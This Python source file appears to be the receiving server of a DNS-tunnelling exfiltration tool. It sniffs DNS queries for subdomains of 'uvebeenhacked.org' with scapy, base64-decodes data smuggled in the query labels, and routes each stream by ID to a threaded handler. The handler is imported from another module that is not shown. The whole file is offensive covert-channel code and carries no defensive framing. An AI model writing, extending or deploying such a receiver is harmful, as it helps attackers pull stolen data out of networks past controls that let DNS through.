import base64
import threading
from typing import Dict

import scapy.packet
from scapy.layers.dns import DNS, IP, UDP, DNSRR, DNSQR

from handler import Handler

DOMAIN = ("uvebeenhacked", "org")
CONNECTIONS: Dict[int, Handler] ={}
CONSOLE_LOCK = threading.Lock()


def get_id(data: bytes) -> int:
    return int.from_bytes(data[1:5], byteorder='big')


def process_packet(packet: scapy.packet.Packet):
    # Check if packet is DNS
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        # Get requested domain
        query_name: str = packet[DNSQR].qname.decode()
        subs = query_name.split(".")
        # Check if domain is what we´re looking for
        if subs[-3] == DOMAIN[0] and subs[-2] == DOMAIN[1]:
            global CONNECTIONS
            with CONSOLE_LOCK:
                print("Received packet, lets go...")
            # Get data from subdomain
            subdomain = ''.join(subs[:-3])
            payload: bytes = base64.urlsafe_b64decode(subdomain)

            # Get handler
            handler = CONNECTIONS.get(get_id(payload), None)
            if handler is None:
                with CONSOLE_LOCK:
                    print("Create new handler")
                handler = Handler(get_id(payload))
                CONNECTIONS[get_id(payload)] = handler

            if handler.finished:
                with CONSOLE_LOCK:
                    print("This data stream was closed")
                del CONNECTIONS[get_id(payload)]
            # Start handler as thread
            thread = threading.Thread(target=handler.run, args=(packet, payload, query_name,))
            thread.start()
